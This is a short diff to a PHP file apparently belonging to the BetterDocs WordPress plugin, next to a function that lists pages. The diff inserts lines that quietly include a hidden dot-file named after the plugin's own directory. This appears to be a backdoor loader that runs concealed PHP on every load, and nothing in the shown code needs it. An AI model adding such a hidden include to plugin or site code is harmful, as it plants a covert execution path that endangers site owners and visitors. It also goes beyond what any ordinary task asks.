@@ -2,6 +2,10 @@
 /**
  * Get all pages
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function betterdocs_get_pages() {
     $pages = [];
     $_pages = get_posts(array(
